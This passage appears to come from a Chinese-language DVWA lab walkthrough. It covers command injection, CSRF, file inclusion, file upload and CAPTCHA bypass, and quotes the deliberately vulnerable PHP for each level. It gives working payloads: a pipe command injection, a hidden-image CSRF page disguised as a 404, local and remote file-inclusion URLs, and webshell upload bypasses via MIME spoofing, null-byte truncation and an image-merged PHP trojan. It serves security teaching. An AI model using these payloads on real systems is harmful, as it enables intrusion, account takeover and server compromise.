&#39;$&#39;  =&gt; &#39;&#39;, &#39;(&#39;  =&gt; &#39;&#39;, &#39;)&#39;  =&gt; &#39;&#39;, &#39;`&#39;  =&gt; &#39;&#39;, &#39;||&#39; =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt;</code></pre><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p><p>127.0.0.1|net user</p><p>127.0.0.1|net user 利用</p><p>Command 1 | Command 2</p><p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p><p>Impossible：</p><p>不存在命令注入漏洞</p><p><a href="http://www.4hou.com/technology/1012.html" target="_blank" rel="external">使用Metasploit对DVWA进行命令注入攻击</a></p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $target = $_REQUEST[ &#39;ip&#39; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&#39;s put the IP back together. $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><h3 id="四：CSRF"><a href="#四：CSRF" class="headerlink" title="四：CSRF"></a>四：CSRF</h3><p>Cross-Site Request Forgery，跨站请求伪造，也称为One Click Attack，或者Session Riding。</p><p>是一种对网站的恶意利用。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。</p><p>XSS与之相反，XSS利用站点内的信任用户进行攻击。</p><p>举个例子</p><p>下面这幅图片应该比较形象了，用户浏览器在不知情的情况下访问了A网站。并且A网站是可以正常访问的，因为Cookie并没有失效。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240200_145.jpg" alt=""><br>再举个实际中可能发生的例子</p><p>一个网站用户Bob可能正在浏览聊天论坛，而同时另一个用户Alice也在此论坛中，并且后者刚刚发布了一个具有Bob银行链接的图片消息。设想一下，Alice编写了一个在Bob的银行站点上进行取款的form提交的链接，并将此链接作为图片tag。如果Bob的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当Bob的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经Bob同意的情况下便授权了这次事务。</p><p>这个例子是上面的英文版描述。改变配置、强制提交信息、取消会员等危害。</p><p>CSRF是一种依赖web浏览器的、被混淆过的代理人攻击（deputy attack）</p><pre><code>CSRF攻击依赖下面的假定：1 攻击者了解受害者所在的站点2 攻击者的目标站点具有持久化授权cookie或者受害者具有当前会话cookie3 目标站点没有对用户在网站行为的第二授权</code></pre><p>low：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>代码中在获取了$pass_new和$pass_conf这两个变量之后，利用mysql_real_escape_string()函数进行了过滤，这样虽然可以防止SQL注入，但却无法阻止CSRF攻击，之后这两个变量便被直接代入UPDATE语句中执行了数据库更新操作。</p><blockquote><p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制</p></blockquote><p>CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p><p>漏洞利用</p><p>1.<br><a href="http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#" target="_blank" rel="external">http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成password</p><p>2.构造攻击页面</p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p><pre><code>&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;</code></pre><p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Checks to see where the request came from if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) ) { // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // Didn&#39;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt; </code></pre><p>可以看到这里在获取$pass_new和$pass_conf这两个变量之前，先利用一个if语句来判断“$_SERVER[‘HTTP_REFERER’]”的值是否是127.0.0.1。这是一种基本的防御CSRF攻击的方法：验证HTTP Referer字段。我们可以再次使用之前的方法来实施CSRF攻击，可以发现已经不起作用了。下面就来解释一下这种防御方法的原理。</p><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。比如下面这个利用Burpsuite拦截到的数据包，数据要提交到的页面是upfile_Other.asp，而我们是通过Referer字段后的<a href="http://192168.80.131/upload_Other.asp这个页面发起的请求。" target="_blank" rel="external">http://192168.80.131/upload_Other.asp这个页面发起的请求。</a></p><blockquote><p>根据Referer验证请求来源，绕过思路：在HTTP请求头声明Referer。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240213_708.png" alt=""></p></blockquote><p>High：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p>这里需要管理员首先输入当前密码，然后才能重新设置密码。这就是目前非常有效的一种防御CSRF攻击的方法：二次确认。<br>不会</p><p>impossible：</p><p>Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><hr><h3 id="五：文件包含漏洞"><a href="#五：文件包含漏洞" class="headerlink" title="五：文件包含漏洞"></a>五：文件包含漏洞</h3><p>文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。<br>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见包含函数有：include()、require()<br>区别：</p><pre><code>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</code></pre><p>require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p><p>low：</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];?&gt; </code></pre><p>URL可发现，注入点在page，low等级直接注入<br><a href="http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile" target="_blank" rel="external">http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile</a><br>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241240_986.png" alt=""><br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br>成功进入服务器的php.ini文件<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241247_240.png" alt=""></p><p>构造url（相对路径）</p><pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpStudy\WWW\DVWA-1.9\php.ini</code></pre><p>2.远程文件包含</p><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在远程服务器192.168.5.12上传一个phpinfo.txt文件.<br>构造url</p><pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=http://192.168.5.12/phpinfo.txt</code></pre><p>Medium:</p><p>&lt;php</p><p>//Thepagewewishtodisplay<br>$file=$_GET[‘page’];</p><p>//Inputvalidation<br>$file=str_replace(array(“<a href="http://&quot;,&quot;https://&quot;),&quot;&quot;,$file" target="_blank" rel="external">http://&quot;,&quot;https://&quot;),&quot;&quot;,$file</a>);<br>$file=str_replace(array(“../“,”..\””),””,$file);</p><p>&gt;</p><p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”<a href="https://”、" target="_blank" rel="external">https://”、</a> ” ../”、”..\”替换为空字符。</p><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。<br>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p><p>paylaod:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a></p><p>远程文件包含:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt</a></p><p>High:</p><pre><code>&lt;php//Thepagewewishtodisplay$file=$_GET[&#39;page&#39;];//Inputvalidationif(!fnmatch(&quot;file*&quot;,$file)&amp;&amp;$file!=&quot;include.php&quot;){   //Thisisn&#39;tthepagewewant!echo&quot;ERROR:Filenotfound!&quot;;exit;}&gt;</code></pre><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p><p>思路：利用file协议绕过防护策略。<br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241306_740.png" alt=""><br>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><p>Impossible：</p><pre><code>&lt;php//Thepagewewishtodisplay$file=$_GET[&#39;page&#39;];//Onlyallowinclude.phporfile{1..3}.phpif($file!=&quot;include.php&quot;&amp;&amp;$file!=&quot;file1.php&quot;&amp;&amp;$file!=&quot;file2.php&quot;&amp;&amp;$file!=&quot;file3.php&quot;){//Thisisn&#39;tthepagewewant!echo&quot;ERROR:Filenotfound!&quot;;exit;}&gt;</code></pre><p>Impossible级别的代码使用了白名单机制进行防护，白名单算是目前最有效的防过滤手段。</p><p>柠檬师傅的总结：<br><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a></p><h3 id="五：File-Upload"><a href="#五：File-Upload" class="headerlink" title="五：File Upload"></a>五：File Upload</h3><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241313_324.png" alt=""></p><p>Low：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; </code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241319_392.png" alt=""><br>连接菜刀getshell~<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241336_64.png" alt=""><br>Medium：</p><p>&lt;?php </p><pre><code>if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } ?&gt;</code></pre><p>查看源码，可发现代码限制了MIME类型和文件大小<br>if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp; ( $uploaded_size &lt; 100000 ) )<br>绕过思路，改一下MIME类型即可。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241343_499.png" alt=""><br>上传cmd.jpg文件，抓包。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241344_12.png" alt=""><br>尝试修改filename为hack.php。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241345_547.png" alt=""><br>上菜刀得到shell~</p><p>截断绕过规则</p><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。</p><p>可以看到，包中的文件类型为image/png，可以通过文件类型检查。</p><p>High：</p><pre><code>    &lt;?php     if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);     $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];     // Is it an image?     if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;     ( $uploaded_size &lt; 100000 ) &amp;&amp;     getimagesize( $uploaded_tmp ) ) {     // Can we move the file to the upload folder?     if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {     // No     echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;     }     else {     // Yes!     echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;     }     }     else {     // Invalid file     echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     }     }     ?&gt;</code></pre><p>可发现代码限制了后缀名，文件大小和用getimagesize检查文件头并判断文件大小</p><pre><code>&gt; // Is it an image? &gt; if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) )</code></pre><p>strrpos(string,find,start)</p><p>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p><p>getimagesize(string filename)</p><p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p><p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p><p>绕过思路：shell的后缀名改为jpg/jpeg/png，文件头插入jpg/png/gif的头部信息绕过getimagesize，<br>首先利用copy将一句话木马文件cmd.php与图片文件1.jpg合并Piccmd.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241425_841.png" alt=""></p><p>上菜刀得到shell</p><p>Impossible：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; // Where are we going to be writing to? $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;; //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; $temp_file = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); $temp_file.= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#39;image/jpeg&#39; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>该级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><h3 id="七：Insecure-CAPTCHA"><a href="#七：Insecure-CAPTCHA" class="headerlink" title="七：Insecure CAPTCHA"></a>七：Insecure CAPTCHA</h3><p>reCAPTCHA验证流程</p><p>这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241444_780.jpg" alt=""></p><p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p><p>recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</p><p>low：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } mysql_close(); } ?&gt;</code></pre><p>通过构造参数绕过验证过程的第一步<br>首先输入密码，点击Change按钮，抓包，更改step参数=2绕过验证码</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt; &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both 